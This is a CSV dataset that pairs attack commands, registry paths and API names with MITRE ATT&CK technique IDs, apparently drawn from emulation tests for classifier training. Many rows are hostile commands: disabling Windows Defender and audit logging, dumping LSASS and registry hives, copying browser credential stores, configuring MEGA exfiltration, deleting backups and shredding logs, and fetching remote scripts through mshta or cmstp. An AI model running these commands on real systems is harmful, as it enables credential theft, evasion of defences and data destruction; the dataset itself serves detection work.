command,mitre_id
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet"" -Name ""DisableBlockAtFirstSeen"" -Value 1",T1562
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt,T1070
sockstat -6 2>/dev/null || true,T1049
tar -cf {PATH}:ads {PATH_ABSOLUTE:folder},T1564
/etc/selinux/config,T1083
setfile -a V $filename,T1564
assoc $extension_to_change=$target_extension_handler,T1546
psexec.exe,T1562
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f",T1546
ResponseOption,T1529
~/.zshrc,T1546
cmd.exe /c %s,T1059
argv,T1036
esentutl.exe /y $path\autoruns.exe /d $path\file.txt:autoruns.exe /o,T1564
WinRAR,T1560
setUserPassword,T1056
pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct,T1216
DeviceInformation,T1082
do_download,T1105
if ($result) {,T1562
CreateToolhelp32Snapshot,T1057
winrm,T1021
sc.exe \\$remote_host start $service_name,T1543
"([adsisearcher]""objectcategory=user"").FindAll(); ([adsisearcher]""objectcategory=user"").FindOne()",T1087
HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum,T1680
"Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""shadow""; uValue=[uint32]2} -CimSession $s",T1112
CreateAccessKey,T1098
"Set-ItemProperty ""HKCU:\software\classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""$executable_binary"" -Force",T1548
"([ ""$(uname)"" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))",T1078
copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe,T1574
SYSTEM,T1569
WinProj.exe {REMOTEURL},T1105
sekurlsa::Minidump lsassdump.dmp,T1003
find / -perm +2000 2>/dev/null,T1548
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDrives.lnk,T1547
Get-ADReplAccount -All -Server $logonserver,T1003
MISC::AddSid,T1134
rm -rf /var/log/security,T1070
sysctl,T1622
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1060
GetForegroundWindow,T1622
"random_kernel_pid=$(ps -ef | grep ""\[.*\]"" | awk '{print $2}' | shuf -n 1)",T1036
ieinstal.exe,T1548
Get{Extension/Filter}Version,T1505
/tmp/art.sh,T1027
"cd ""$env:PathToAtomicsFolder\T1555.003\bin""",T1555
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet,T1021
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""AUOptions"" /t REG_DWORD /d 2 /f",T1112
/lib/preload.so reboot newreboot 1,T1574
/var/run/haldrund.pid,T1480
"Add-Type -TypeDefinition @""",T1562
mshta.exe {REMOTEURL},T1105
"""powershell.exe"" /c net user DefaultAccount /active:yes",T1078
post/windows/gather/credentials/gpp,T1552
pr_set_mm_exe_file,T1036
"Invoke-Rubeus -Command ""asreproast /format:hashcat /nowrap""",T1558
"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v ProductName",T1082
netstat -aon,T1049
"Invoke-WebRequest $domain -UserAgent ""HttpBrowser/1.0"" | out-null",T1071
Invoke-PSInject,T1055
services.exe,T1543
1950a258-227b-4e31-a9cf-717495945fc2,T1071
"wmic /node:""$target_host"" process call create ""cmd.exe /c esentutl.exe /y /vss $source_path /d $target_path""",T1003
"healthCheck.type = ""http""",T1046
sts:GetFederationToken,T1098
ITaskDefinition,T1559
Force = $true,T1114
"echo ""Executing extracted payload:""",T1027
Stop-NetEventSession -Name Capture007,T1040
az key vault secret show,T1555
New-Item -Path $teamviewer_log_file -Force | Out-Null,T1070
ZwQuerySystemInformation,T1106
"Try {cmd /c ""$AdvancedRun_Location"" /EXEFilename ""$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe"" /WindowState 0 /CommandLine ""$CommandToRun"" /StartDirectory """" /RunAs 8 /Run} Catch{}",T1562
PubkeyAuthentication,T1098
/var/log/secure,T1070
/Users,T1564
if (-not $match) { return },T1083
"""$venv_path\Scripts\pypykatz"" live lsa",T1003
"""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe""",T1027
"sc.exe create $service_name binPath= ""$binary_path"" start=$startup_type type=$service_type",T1543
GetLogicalDrives(),T1106
%temp%\T1036.007_masquerading.xlsx.vbs,T1036
net view <host>,T1135
VSDiagnostics.exe start 1 /launch:{PATH:.exe},T1127
/lib/systemd/system/,T1543
CreationTime,T1070
"public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,",T1562
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIOAVProtection"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
wmic shadowcopy call create Volume=$drive_letter,T1003
fsutil,T1082
net user /add /domain,T1136
OpenProcessToken,T1134
"Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunServicesOnce""",T1012
echo '$command_to_add' >> ~/.shrc,T1546
"stop-process -name ""CalculatorApp"" -Force -ErrorAction Ignore",T1218
chmod +x,T1222
HKCU\Software\KasperskyLab,T1012
fruit -noninteractive -consoleoutput,T1046
cat /tmp/encoded.dat | $cmd > /tmp/art.sh,T1027
makecab,T1560
cd $HOME,T1005
$PATH,T1574
chmod -R 755,T1222
ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL},T1567
be_BY,T1614
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f,T1562
rad<5-hex-chars>.tmp,T1074
dscl . -create /Users/$username,T1136
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages,T1547
fsutil.exe trace decode,T1218
net use c: $share_name,T1070
TimeZone = (Get-TimeZone).Id,T1614
Invoke-WebRequest -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe,T1219
"mkdir -p ""$USER_PACKAGES""",T1546
rar,T1560
HKCU\Software\Microsoft\[dllname],T1112
/Library/Keychains/,T1555
killall 'Google Chrome',T1539
chown $owner:$group $file_or_folder,T1222
"set-Content $rclone_config_path\rclone\rclone.conf ""[$remote_share] `n type = mega `n user = $mega_user_account `n pass = $mega_user_password""",T1567
Update.exe --updateRollback={PATH_SMB:folder},T1218
"ls -ld /etc/rc*.d 2>/dev/null || echo ""No /etc/rc*.d directories found""",T1007
/etc/init/,T1037
FindFirstUrlCacheEntryA,T1106
port proxy,T1090
%SYSTEMROOT%,T1574
echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt,T1202
"cscript.exe /E:Jscript ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""",T1547
user-auth_pubkey,T1556
mega.nz,T1567
echo 'fd.write(source)' >> $python_script_name,T1059
C:Windowsinfpub.dat,T1218
param (,T1005
[Win32.Wallpaper]::SetWallpaper($imgLocation),T1491
wbadmin delete systemstatebackup -keepVersions:0,T1490
"reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ""$executable_binary"" /f",T1548
aws iam get-account-password-policy,T1201
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System,T1562
cmstp.exe /ni /s {REMOTEURL:.inf},T1218
.../Contents/MacOS/,T1553
usercustomize.py,T1546
"& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" $optional_args -h $domain -s subtree -f ""objectclass=computer"" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime",T1087
reg save hklm\security,T1003
SHEmptyRecycleBinW(),T1490
"$PYTHON_EXE -m venv ""$TEMPDIR/env""",T1546
gcloud config set project $project_id,T1098
%USERNAME%,T1033
Exec,T1547
"wmic /node:$target_host os get Locale,OSLanguage,MUILanguages /format:$format_style",T1614
"invoke-item ""$($driveLetter):\hello.exe""",T1553
devinit.exe run -t msi-install -i {REMOTEURL:.msi},T1218
dswsd,T1083
vssadmin.exe create shadow /for=$drive_letter,T1003
wlQYLoPCil3niI7x8CvR9EtNtL/aeaHrZ23LP3fAsJogVTIzdnZ5Pi09ZVeHFkiB,T1140
Test-NetConnection -CommonTCPPort HTTP -ComputerName $target,T1016
Remove-Item $teamviewer_log_file -Force -ErrorAction Ignore,T1070
./aws_secret.sh,T1098
mshta.exe javascript:a=(GetObject('script:$file_url')).Exec();close();,T1218
"if (test-path ""$FirefoxCredsLocation\key4.db"") {copy-item ""$FirefoxCredsLocation\key4.db"" -destination ""$exfil_folder\T1555.003Firefox_key4.db""} else {}",T1555
show aaa,T1201
"copy ""$inputfile"" $outputfile",T1036
rsync -r $username@$remote_host:$remote_path $local_path,T1105
nbtstat,T1016
sudo $program_path -a -t 3,T1040
Crash,T1218
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp,T1060
Software\SimonTatham\Putty\Sessions,T1552
getUsername,T1033
/bin/sh,T1059
PTRACE_POKETEXT,T1055
SeLoadDriverPrivilege,T1547
"forfiles /p c:\windows\system32 /m notepad.exe /c ""{PATH_ABSOLUTE}:evil.exe""",T1564
certutil -addstore -f -user ROOT ProgramData\cert512121.der,T1553
reg save HKLM\system %temp%\system,T1003
dir \\$computer_ip\IPC$,T1135
procdump.exe -md {PATH:.dll} foobar,T1202
loadfromstorage,T1055
pw lock art,T1078
vmware_kb.exe,T1036
if (Test-Path $edgePath32) {,T1218
Evilginx2,T1539
wbadmin.exe delete catalog -quiet,T1490
"""cmd.exe"" /C whoami",T1059
InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.,T1218
new-itemproperty $key$name -Name http -Value 2 -Type DWORD;,T1112
Invoke-Kerberoast,T1558
Add-Type -AssemblyName System.IO.Compression.FileSystem,T1560
"echo ""$command"" > /etc/cron.weekly/$cron_script_name",T1053
"""C:\Program Files\Windows Defender\MpCmdRun.exe"" -RemoveDefinitions -All",T1562
"""import os, subprocess; os.environ.get('CALC_SPAWNED') or (os.environ.update({'CALC_SPAWNED':'1'}) or subprocess.Popen(['calc.exe']))"" | Out-File -Encoding ASCII ""$SitePackages\atomic_hook.pth""",T1546
$error.clear(),T1497
AddressOfEntryPoint,T1055
DSEnumerateDomainTrusts(),T1482
screencapture -x $output_file,T1113
mv $cert_filename /usr/local/share/ca-certificates,T1553
PTRACE_DENY_ATTACH,T1622
"Start-Process -FilePath ""powershell"" -ArgumentList ""-c (New-Object -ComObject 'Shell.Application').FileRun()"" -WindowStyle Hidden",T1202
"New-Item -ItemType Directory -Path ""$output_folder""",T1530
"cmd.exe /c %APPDATA%\svchost.exe ""PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs""",T1036
"schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""",T1053
makecab $path\autoruns.exe $path\cabtest.txt:autoruns.cab,T1564
shutdown -r $timeout,T1529
ntdsutil,T1003
"wmic /node:$node process call create ""rundll32.exe \""$dll_to_execute\"" $function_to_execute""",T1047
"if (test-path ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"") {copy-item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"" -destination ""$exfil_folder\T1555.003Chrome_Login Data""} else {}",T1555
"az storage file upload --account-name ""$storage_account_name"" --share-name ""$file_share_name"" -p ""$file_path"" --source ""$code_to_insert_path"" --only-show-errors",T1528
certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe,T1140
"echo $ENCODED > $encoded_file && perl -le 'use MIME::Base64;open($f,""<"",""$encoded_file"");print(decode_base64(<$f>));'",T1140
gdi32,T1113
MSST,T1053
chown root /tmp/hello,T1548
"Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit-backup"" -Value ""$oldvalue"";",T1547
"Get-Item -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify""",T1012
"reg add ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f",T1112
move [file path] c:\windows\system32\spool\prtprocs\x64\spool.dll,T1036
C:\Users\Public\WinSrcNT\It11.exe,T1005
"Registry.CurrentUser.CreateSubKey(""Software\\Classes\\CLSID\\{"" + clsid + ""}\\InProcServer32"")",T1546
"hh.exe ""$local_chm_file""",T1218
"if [ -f ""$USER_PACKAGES/usercustomize.py"" ]; then echo ""Success: usercustomize.py created under $USER_PACKAGES\n"" $(ls -la ""$USER_PACKAGES"" | grep usercustomize*); else echo ""Failed: usercustomize.py not found under $USER_PACKAGES""; fi",T1546
} finally {,T1562
echo $ENCODED | xxd -r -p,T1140
reg query \\<host>\HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Internet Settings,T1012
"Start-Process -FilePath $edrFreezeExe -ArgumentList (""$($process.Id) 15000"") | Out-Null",T1562
rundll32.exe,T1218
"Get-NetFirewallProfile | Format-Table Name, Enabled",T1518
scp,T1105
"Get-ChildItem ""$file_path"" | % { $_.LastAccessTime = ""$target_date_time"" }",T1070
"New-ItemProperty ""HKCU:\Software\Policies\Microsoft\Windows\OOBE"" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force",T1562
file */* *>> $output_file,T1083
LoginHook,T1037
HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile,T1562
"if [ -x ""$(command -v id)"" ]; then id; else echo ""id is missing from the machine. skipping...""; fi;",T1069
PowerShell -version 2 -command '$v2_command',T1562
"if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i ""Droplet\|HVM\|VirtualBox\|VMware""; fi",T1082
Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop,T1562
Start-Process -FilePath $env:Temp\KeyScrambler_Setup.exe -ArgumentList /S -Wait,T1574
HKLM\Software\Microsoft\Windows\CurrentVersion\Run,T1547
else { Copy-Item $_.FullName -Destination $dest -Force -ErrorAction SilentlyContinue },T1560
Invoke-ATHHTMLApplication -ScriptEngine $script_engine -InlineProtocolHandler $protocol_handler -UseRundll32 -Rundll32FilePath $rundll32_file_path,T1218
"if (-not (Test-Path -Path ""$output_folder"")) {",T1530
"& '.\Excel 2016.lnk' ""PathToAtomicsFolder\T1204.002\bin\mirrorblast_emulation.xlsm""",T1204
update.py,T1036
HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\AccessVBOM,T1112
ExampleFunctionA,T1218
"Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Run""",T1012
vssadmin list shadows,T1680
.so,T1129
"echo ""block in proto tcp from 1.2.3.4 to any"" | pfctl -a pf-rules -f -",T1562
Start-Sleep -Milliseconds 500,T1202
passwd $user_account #enter admin password > enter new password > confirm new password,T1531
if_nameindex,T1016
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d $new_executable /f,T1112
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog,T1562
"Start-Process -Wait -FilePath ""$UltraViewer_Path"" -Argument ""/silent"" -PassThru",T1219
main,T1140
Stop-Process $chromeProcess -Force,T1539
letmein,T1033
SetThreadExecutionState,T1106
"Write-Host ""The registry value was set to 0, temporarily changing to 1.""",T1137
"TableName = """"",T1619
SOFTWARE\Microsoft\Windows\CurrentVersion\Run\,T1547
Program,T1543
Get-NetForestTrust,T1482
nmap $host_to_scan,T1046
"rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}",T1105
SleepEx,T1106
then echo '#art_test_1562_006_2' >> /etc/$syslog_config_file_name,T1562
sudo shred -u -z -n 3 $system_log_path,T1070
Write-Host -ForegroundColor Red $result,T1016
Set-AzureADUserPassword -ObjectId $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue,T1098
C:\system\screenshot.bmp,T1113
set file=$output_file_path\user_info_%random%.tmp,T1033
Service Principal,T1078
New-Item -ItemType Directory -Path $fileSharePath,T1530
Invoke-BloodHound -OutputDirectory $env:Temp,T1059
net view /all time,T1124
"& (-join $ps) ""-Command"" (-join $cmd)",T1027
example.service,T1053
ToolHelp32,T1106
$PathToAtomicsFolder\T1055\bin\x64\CreateThread.exe -debug,T1055
login,T1546
"echo ""$password"" | pw usermod $username -h 0",T1136
grep '*:0:' /etc/passwd >> $output_file,T1087
FromBase64String,T1140
Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force,T1217
"sudo sed -i ""$indexs,^,$pam_rule\n,g"" $path_to_pam_conf",T1556
adplus.exe -c {PATH:.xml},T1127
QueryServiceStatusEx,T1007
